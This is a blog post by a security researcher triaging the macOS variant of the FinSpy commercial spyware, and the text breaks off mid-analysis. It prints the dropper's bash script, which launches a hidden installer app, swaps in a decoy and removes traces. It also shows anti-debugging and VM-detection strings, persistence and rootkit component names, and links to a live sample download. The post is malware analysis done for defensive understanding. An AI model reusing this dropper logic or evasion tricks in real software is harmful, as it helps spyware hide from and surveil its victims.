<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x4F/installMap.png />
<meta name="twitter:title" content=FinFisher&#32;Filleted&#32;üêü />
<meta name="twitter:description" content=a&#32;triage&#32;of&#32;the&#32;FinSpy&#32;(macOS)&#32;malware />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=FinFisher&#32;Filleted&#32;üêü />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x4F/installMap.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">FinFisher Filleted üêü</div>
  <div class="blogSubTitle">a triage of the FinSpy (macOS) malware</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / September 26, 2020</div>
  <br>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px">
    <center>Love these blog posts and/or want to support my research and tools? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/FinSpy.zip">samples</a> (OSX.FinSpy) to our malware collection (password: infect3d)</p>
<p>&hellip;please don‚Äôt infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>Recently, <a href="https://twitter.com/botherder">Claudio Guarnieri</a> highlighted some intriguing new research published by his research lab at Amnesty International:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Sometimes threat intel is hard, sometimes folks leave all FinFisher samples exposed on a webserver. So here ya go, along with recent Windows and Android, we&#39;re publishing details on new FinFisher for Mac OS üçé and Linux üêß.<a href="https://t.co/eakdBWcYbF">https://t.co/eakdBWcYbF</a></p>&mdash; nex (@botherder@mastodon.social) (@botherder) <a href="https://twitter.com/botherder/status/1309449600110129152?ref_src=twsrc%5Etfw">September 25, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>Titled, &ldquo;<a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed</a>,&rdquo; this writeup detailed FinFisher&rsquo;s spyware suite (FinSpy), including &ldquo;<em>previously undisclosed versions for Linux and MacOS computers&rdquo;</em>!</p>
<p>As noted in their report:</p>
<blockquote>
"FinSpy is a commercial spyware suite produced by the Munich-based company FinFisher Gmbh. Since 2011 researchers have documented numerous cases of targeting of Human Rights Defenders (HRDs) - including activists, journalists, and dissidents with the use of FinSpy in many countries, including Bahrain, Ethiopia, UAE, and more."
</blockquote>
<div class="note">
<p>Amnesty&rsquo;s writeup is great place to start, and provides a lot of great detail and insights about FinSpy &hellip;including the newly uncovered macOS variant.</p>
<p>As such, it is a must read:</p>
<center>
"<a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/" class="inlineLink">German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed</a>"
</center>
<p><b>Update</b>
<br>
Other security researchers have also now published their research:</p>
<ul>
<li>
<p>&ldquo;<a href="https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/" class="inlineLink">The Finfisher Tales, Chapter 1: The dropper</a>&rdquo; (by: <a href="https://twitter.com/osxreverser" class="inlineLink">@osxreverser</a>).</p>
</li>
<li>
<p>&ldquo;<a href="https://www.sentinelone.com/blog/how-to-catch-a-spy-detecting-finfisher-spyware-on-macos/" class="inlineLink">How to Catch a Spy | Detecting FinFisher Spyware on macOS</a>&rdquo; (by: <a href="https://twitter.com/philofishal" class="inlineLink">@philofishal</a>).</p>
</li>
</ul>
</div>
<p>In this blog post, we provide a hands-on triage of the macOS variant of FinSpy. We build upon Amnesty International&rsquo;s (great) research, as well as cover new components of the malware, such as it&rsquo;s kernelmode rootkit component.</p>
<h3 id="finspy-for-macos">FinSpy, for macOS</h3>
<p>Amnesty&rsquo;s writeup notes the discovery of a related sample <code>caglayan-macos.dmg</code> (<code>SHA1: 59180391de409c83bef642ad1bca2999ab5fe328</code>) that was &ldquo;<em>found on Virus Total</em>&rdquo;. Our triage will focus on this sample, as within the disk image (<code>.dmg</code>) is an application bundle, which appears be a full, self-contained instance of FinSpy.</p>
<p>To start, we mount the disk image via the <code>hdiutil</code> command:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ hdiutil attach ~/Downloads/FinFisher/caglayan-macos.dmg 
/dev/disk2            GUID_partition_scheme           
/dev/disk2s1          Apple_HFS                       /Volumes/caglayan-macos
</pre>
</div>
<p>If we examine the (now) mounted disk image (<code>/Volumes/caglayan-macos</code>), we see it contains a single item: an application bundle named <code>Install CÃßagÃÜlayan</code>:</p>
<img src="../images/blog/blog_0x4F/dmg.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app</center>

<p>Rather unsurprisingly, <a href="https://objective-see.com/products/whatsyoursign.html">WhatsYourSign</a> shows that this application is unsigned:</p>
<img src="../images/blog/blog_0x4F/unsigned.png"  width="90%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Install CÃßagÃÜlayan.app ...unsigned</center>

<p>We can also confirm the application is unsigned via macOS&rsquo;s built-in <code>codesign</code> utility:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ codesign -dvvv /Volumes/caglayan-macos/Install\ CÃßagÃÜlayan.app 
/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app: <b>code object is not signed at all</b>
</pre>
</div>
<p>Let&rsquo;s take a peek at the <code>Install CÃßagÃÜlayan.app</code> bundle.</p>
<img src="../images/blog/blog_0x4F/showBundle.png"  width="" class="center" style="border-radius: 4px;">

<p>&hellip;definitely some &ldquo;strangeness&rdquo; going on ü§®:
<img src="../images/blog/blog_0x4F/appBundle.png"  width="100%" class="center" style="border-radius: 4px;">

When analyzing a (malicious) application bundle, the application&rsquo;s <code>Info.plist</code> file is a good place to start. To quote the &ldquo;<a href="https://taomm.org/vol1/analysis.html">Art Of Mac Malware</a>&rdquo;:</p>
<blockquote>
<p>&ldquo;When an application is launched, the system consults the <code>Info.plist</code> property list file, as it contains essential (meta)data about the application. Property list files contain key-value pairs.</p>
<p>Pairs that may be of interest when analyzing an application include:</p>
<p><code>CFBundleExecutable</code>
<br>
Contains the name of the application‚Äôs binary (found in <code>Contents/MacOS</code>).</p>
<p><code>CFBundleIdentifier</code>
<br>
Contains the application‚Äôs bundle identifier (often used by the system to globally identify the application).</p>
<p><code>LSMinimumSystemVersion</code>
<br>
Contains the oldest version of macOS that the application is compatible with.&rdquo;</p>
</blockquote>
<p>Here&rsquo;s the <code>Install CÃßagÃÜlayan</code> application&rsquo;s <code>Info.plist</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ cat "/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/Contents/Info.plist"

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
    &lt;dict&gt;
        &lt;key&gt;BuildMachineOSBuild&lt;/key&gt;
        &lt;string&gt;12F45&lt;/string&gt;
        &lt;key&gt;CFBundleAllowMixedLocalizations&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;CFBundleDevelopmentRegion&lt;/key&gt;
        &lt;string&gt;English&lt;/string&gt;
        &lt;key&gt;CFBundleExecutable&lt;/key&gt;
        &lt;string&gt;Install &Ccedil;aƒülayan&lt;/string&gt;
        &lt;key&gt;CFBundleIconFile&lt;/key&gt;
        &lt;string&gt;NativeInstaller.icns&lt;/string&gt;
        &lt;key&gt;CFBundleIdentifier&lt;/key&gt;
        &lt;string&gt;com.coverpage.bluedome.caglayan.desktop.installer&lt;/string&gt;
        &lt;key&gt;CFBundleInfoDictionaryVersion&lt;/key&gt;
        &lt;string&gt;6.0&lt;/string&gt;
        &lt;key&gt;CFBundlePackageType&lt;/key&gt;
        &lt;string&gt;APPL&lt;/string&gt;
        &lt;key&gt;CFBundleShortVersionString&lt;/key&gt;
        &lt;string&gt;2.0&lt;/string&gt;
        &lt;key&gt;DTCompiler&lt;/key&gt;
        &lt;string&gt;com.apple.compilers.llvm.clang.1_0&lt;/string&gt;
        &lt;key&gt;DTPlatformBuild&lt;/key&gt;
        &lt;string&gt;4H1503&lt;/string&gt;
        &lt;key&gt;DTPlatformVersion&lt;/key&gt;
        &lt;string&gt;GM&lt;/string&gt;
        &lt;key&gt;DTSDKBuild&lt;/key&gt;
        &lt;string&gt;10K549&lt;/string&gt;
        &lt;key&gt;DTSDKName&lt;/key&gt;
        &lt;string&gt;macosx10.6&lt;/string&gt;
        &lt;key&gt;DTXcode&lt;/key&gt;
        &lt;string&gt;0463&lt;/string&gt;
        &lt;key&gt;DTXcodeBuild&lt;/key&gt;
        &lt;string&gt;4H1503&lt;/string&gt;
        &lt;key&gt;LSMinimumSystemVersion&lt;/key&gt;
        &lt;string&gt;10.6&lt;/string&gt;
        &lt;key&gt;NSHumanReadableCopyright&lt;/key&gt;
        &lt;string/&gt;
        &lt;key&gt;NSMainNibFile&lt;/key&gt;
        &lt;string&gt;MainMenu&lt;/string&gt;
        &lt;key&gt;NSPrincipalClass&lt;/key&gt;
        &lt;string&gt;NSApplication&lt;/string&gt;
    &lt;/dict&gt;
&lt;/plist&gt;
</pre>
</div>
<p>The value for the <code>CFBundleExecutable</code> key is <code>Install √áaƒülayan</code>. Meaning the item <code>Install CÃßagÃÜlayan.app/Contents/MacOS/Install CÃßagÃÜlayan</code> will be executed when the application is launched (by a victim). As such, we&rsquo;ll continue our analysis there.</p>
<div class="note">
<p>Various key-value pairs provide insight into the &lsquo;age&rsquo; of the malware, and malware author&rsquo;s (build) machine.</p>
<ul>
<li>BuildMachineOSBuild -&gt; 12F45 (Mountain Lion 10.8.5)</li>
<li>DTXcode -&gt; 0463 (Xcode Version 4.6.3)</li>
</ul>
<p>&hellip;yes, rather old!</p>
</div>
<p>Somewhat interestingly, the <code>Install CÃßagÃÜlayan.app/Contents/MacOS/Install CÃßagÃÜlayan</code> file turns out to be a bash script.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file "Install CÃßagÃÜlayan.app/Contents/MacOS/Install CÃßagÃÜlayan"

Install CÃßagÃÜlayan.app/Contents/MacOS/Install CÃßagÃÜlayan: 
  <b>Bourne-Again shell script</b> text executable, UTF-8 Unicode text
</pre>
</div>
<p>Let&rsquo;s take a look at this script:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"></span>BASEDIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span> cd <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>dirname <span style="color:#e6db74">&#34;</span>$0<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&amp;&amp;</span> pwd<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>cd <span style="color:#e6db74">&#34;</span>$BASEDIR<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>open .log/ARA0848.app
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>sleep <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>rm Install<span style="color:#ae81ff">\ </span>√áaƒülayan
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>mv installer Install<span style="color:#ae81ff">\ </span>√áaƒülayan
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>rm -rf .log
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>./Install<span style="color:#ae81ff">\ </span>√áaƒülayan
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>exit</span></span></code></pre></div></p>
<p>After changing in to the script&rsquo;s directory (<code>cd</code>), it executes an application (<code>ARA0848.app</code>) from a hidden <code>.log/</code> directory. It then replaces itself (<code>Install CÃßagÃÜlayan</code>) with a item named <code>installer</code>. This item (<code>installer</code> ‚Üí <code>Install CÃßagÃÜlayan</code>) is then executed.</p>
<p>This can be observed via our <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">Process Monitor</a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    
    "arguments" : [
      "/bin/bash",
      "/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/Contents/MacOS/Install CÃßagÃÜlayan"
    ],
  
    "path" : "/bin/bash"
    ...
  }
},

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "arguments" : [
      "open",
      ".log/ARA0848.app"
    ],
    "path" : "/usr/bin/open"
    ...
  }
},

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "arguments" : [
      "/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/Contents/MacOS/
        .log/ARA0848.app/Contents/MacOS/installer"
    ],
    "path" : "/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/Contents/MacOS/
               .log/ARA0848.app/Contents/MacOS/installer"
    ...
  }
},

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "arguments" : [
      "mv",
      "installer",
      "Install √áaƒülayan"
    ],
    "path" : "/bin/mv"
    ...
  }
},

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "arguments" : [
      "./Install √áaƒülayan"
    ],
    "path" : "/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/
               Contents/MacOS/Install CÃßagÃÜlayan"
    ...
  }
}

</pre>
</div>
<p>The <code>installer</code> file is a Mach-O binary, signed with an Apple Developer ID (<code>CoverPage s.r.o. (4F89KD52V4)</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ file "Install CÃßagÃÜlayan.app/Contents/MacOS/installer"
Install CÃßagÃÜlayan.app/Contents/MacOS/installer: Mach-O 64-bit executable x86_64

$ codesign -dvvv "Install CÃßagÃÜlayan.app/Contents/MacOS/installer"
Executable=/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/Contents/MacOS/installer
Identifier=com.coverpage.bluedome.caglayan.desktop.installer
Format=Mach-O thin (x86_64)
...

Authority=Developer ID Application: CoverPage s.r.o. (4F89KD52V4)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
Timestamp=May 30, 2017 at 11:55:46 PM

</pre>
</div>
<p>&hellip;a brief triage indicates this binary is not malicious (perhaps it is a legitimate downloader?). This makes sense, as a victim launching the (malicious) application, expects something (non-malicious) to visually happen &hellip;otherwise they may become suspicious!</p>
<p>In this case, (once <code>installer</code> has been renamed to <code>Install √áaƒülayan</code> &hellip;and launched), it attempts to install a legitimate version or Adobe Air &hellip;likely needed for the legitimate <code>√áaƒülayan</code> application to run:
<img src="../images/blog/blog_0x4F/updater.png"  width="100%" class="center" style="border-radius: 4px;">
</p>
<p>Since this appears benign, lets turn our attention to <code>.log/ARA0848.app</code> &hellip;which turns out to be the backdoor installer/launcher.</p>
<p><code>ARA0848.app</code> is another unsigned application (recall, that was launched via the <code>Install CÃßagÃÜlayan</code> bash script):</p>
<img src="../images/blog/blog_0x4F/installerApp.png"  width="100%" class="center" style="border-radius: 4px;">

<p>When executed, it will launch its application binary <code>ARA0848.app/Contents/MacOS/installer</code>. This (Mach-O) binary is also unsigned:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ file "Install CÃßagÃÜlayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer"
Install CÃßagÃÜlayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer: Mach-O 64-bit executable x86_64

$ codesign -dvvv "Install CÃßagÃÜlayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer"
/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer: code object is not signed at all

$ shasum "Install CÃßagÃÜlayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer"
2584f1119c65ffd0936e2916b285389404b942c9  /Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer

</pre>
</div>
<p>&hellip;and its detection, is currently rather limited:</p>
<img src="../images/blog/blog_0x4F/detections.png"  width="100%" class="center" style="border-radius: 4px;">

<br>
<div class="note">
<p>Amnesty&rsquo;s <a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/" class="inlineLink">writeup</a> provided a thorough overview of the actions/capabilities of this binary. As such, much of the information in this section was originally reported in their writeup.</p>
<p>&hellip;although here, we dig a little deeper, and build upon it.</p>
</div>
<p>When examining an unknown Mach-O binary, I like to start with the <code>strings</code> command, which (as its name implies) will dump embedded (ASCII) strings. Often this provides valuable insight into the capabilities of the binary!</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ strings - ARA0848.app/Contents/MacOS/installer

ptrace
hw.model
vmware
virtualbox
parallels
system_profiler SPUSBDataType | egrep -i "Manufacturer: (parallels|vmware|virtualbox)"

/usr/bin/python
helper2
system.privilege.admin

/bin/launchctl
load
unload
/sbin/kextunload
helper
installer
logind
/tmp

80.bundle.zip
arch.zip
org.logind.ctp.archive
80.bundle
logind.kext

logind.plist
/Library/LaunchAgents

</pre>
</div>
<p>Interesting! Appears we have strings related to:</p>
<ul>
<li>
<p>anti-debugging? (<code>&quot;ptrace&quot;</code>)</p>
</li>
<li>
<p>virtual machine detection? (<code>&quot;Manufacturer: (parallels|vmware|virtualbox)&quot;</code>)</p>
</li>
<li>
<p>python scripts? (<code>&quot;/usr/bin/python&quot;</code>, <code>&quot;helper2&quot;</code>)</p>
</li>
<li>
<p>launch agent persistence? (<code>&quot;/bin/launchctl&quot;</code>, <code>&quot;/Library/LaunchAgents&quot;</code>, <code>&quot;logind.plist&quot;</code>)</p>
</li>
<li>
<p>kernel extension (rootkit)? (<code>&quot;logind.kext&quot;</code>)</p>
</li>
</ul>
<p>As the binary is written in Objective-C, we can use the <a href="https://github.com/nygard/class-dump">class-dump</a> tool to extract embedded (Objective-C) classes:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ class-dump "ARA0848.app/Contents/MacOS/installer"

__attribute__((visibility("hidden")))
@interface appAppDelegate : NSObject <NSApplicationDelegate>
{
}

- (BOOL)askUserPermission:(id)arg1;
- (BOOL)isAfterPatch;
- (void)removeTraces;
- (void)launchOldStyle;
- (BOOL)launchNewStyle;
- (BOOL)installPayload;
- (void)executeTrampoline;
- (void)expandPayload;
- (void)removeOldResource;
- (void)applicationDidFinishLaunching:(id)arg1;

@end

__attribute__((visibility("hidden")))
@interface GIFileOps : NSObject
{
}

+ (void)unloadKext;
+ (BOOL)unloadAgent:(id)arg1;
+ (BOOL)loadAgent:(id)arg1;
+ (BOOL)setFile:(id)arg1 withAttributes:(id)arg2;
+ (BOOL)setDataFileAttributes:(id)arg1;
+ (BOOL)setExecutableFileAttributes:(id)arg1;
+ (BOOL)setDirectoryAttributes:(id)arg1;
+ (id)baseAttributes;
+ (BOOL)setStandardAttributes:(id)arg1;
+ (BOOL)setSuid:(id)arg1;
+ (BOOL)rename:(id)arg1 to:(id)arg2;
+ (BOOL)remove:(id)arg1;
+ (BOOL)move:(id)arg1 to:(id)arg2;
+ (BOOL)createDirectory:(id)arg1 shouldDelete:(BOOL)arg2;
+ (BOOL)copy:(id)arg1 to:(id)arg2;
+ (BOOL)unzip:(id)arg1 to:(id)arg2;

@end

__attribute__((visibility("hidden")))
@interface GIPath : NSObject
{
}

+ (id)masterKeyDirSource;
+ (id)masterKeyDirTarget;
+ (id)supervisorTarget;
+ (id)supervisorSource;
+ (id)supervisorName;
+ (id)agentTarget;
+ (id)agentSource;
+ (id)agentName;
+ (id)coreTarget;
+ (id)coreSource;
+ (id)coreName;
+ (id)kextTarget;
+ (id)kextSource;
+ (id)kextName;
+ (id)expandedMainBundle;
+ (id)expandedPayload;
+ (id)compressedPayload;
+ (id)updatePackage;
+ (id)payload;
+ (id)installer;
+ (id)trampoline;
+ (id)systemTemp;
+ (id)installationMap;
+ (id)executables;

@end

...

</pre>
</div>
<p>Although there aren&rsquo;t a ton of classes, we definitely have extracted some interesting method names (<code>&quot;installPayload&quot;</code>, <code>&quot;loadAgent:&quot;</code>, <code>&quot;kextTarget&quot;</code>, etc), which we can analyze in a disassembler, or set breakpoints in a debugger.</p>
<p>Speaking of, time to disassemble and debug!</p>
<p>The malware&rsquo;s <code>main</code> method begins at <code>0x000000010000174f</code>. Scrolling thru the disassembly, it appears that the malware employs some static obfuscation:</p>
<img src="../images/blog/blog_0x4F/obfuscate.png"  width="66%" class="center" style="border-radius: 4px;">

<p>In their <a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">writeup</a>, the Amnesty researchers shed more light on this:</p>
<blockquote>
"the [malware] developers took measures to complicate its analysis. All the binaries are obfuscated with the open source LLVM-obfuscator developed by a research team in 2013."
</blockquote>
<p>Good news, this obfuscation doesn&rsquo;t really hinder analysis. One can simply scroll past it in a disassembler, or in a debugger set breakpoints on relevant (non-obfuscated) code.</p>
<p>At the start of the malware&rsquo;s <code>main</code> function, it executes various anti-analysis logic including:</p>
<ul>
<li>
<p>invoking a function named <code>deny_ptrace</code> to prevent debugging via ptrace (<code>PT_DENY_ATTACH</code>).</p>
</li>
<li>
<p>a call to <code>_sysctl</code> perhaps to check for the <code>P_TRACED</code> flag.</p>
</li>
<li>
<p>virtual machine detection via the enumeration of the system <code>model</code> named, via <code>sysctlbyname(&quot;hw.model&quot; ...)</code> and via <code>system_profiler SPUSBDataType | egrep -i \&quot;Manufacturer: (parallels|vmware|virtualbox)</code>.</p>
</li>
</ul>
<p>Once identified, this anti-analysis logic is trivial to bypass in a debugger. How? Simply set a breakpoint(s), then modify the instruction pointer (<code>RIP</code>) to skip over them:</p>
<img src="../images/blog/blog_0x4F/bypass.png"  width="" class="center" style="border-radius: 4px;">

<p>In the <a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">writeup</a>, the Amnesty researchers note that the malware will decrypt an encrypted archive:</p>
<blockquote>
"...it then decrypts ...a Zip archive. This archive contains the installer, the main cyload, but also binaries for privilege escalation"
</blockquote>
<p>&hellip;oh, we definitely want all that!</p>
<p>At address <code>0x100003106</code> (within a method named <code>expandPayload</code>), the malware invokes a method from the <code>GIFileOps</code> named <code>unzip:to:</code>. Let&rsquo;s set a debugger breakpoint there:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) b 0x0000000100003106
Breakpoint 5: address = 0x0000000100003106
</pre>
</div>
<p>When this breakpoint is hit, we can examine the arguments:</p>
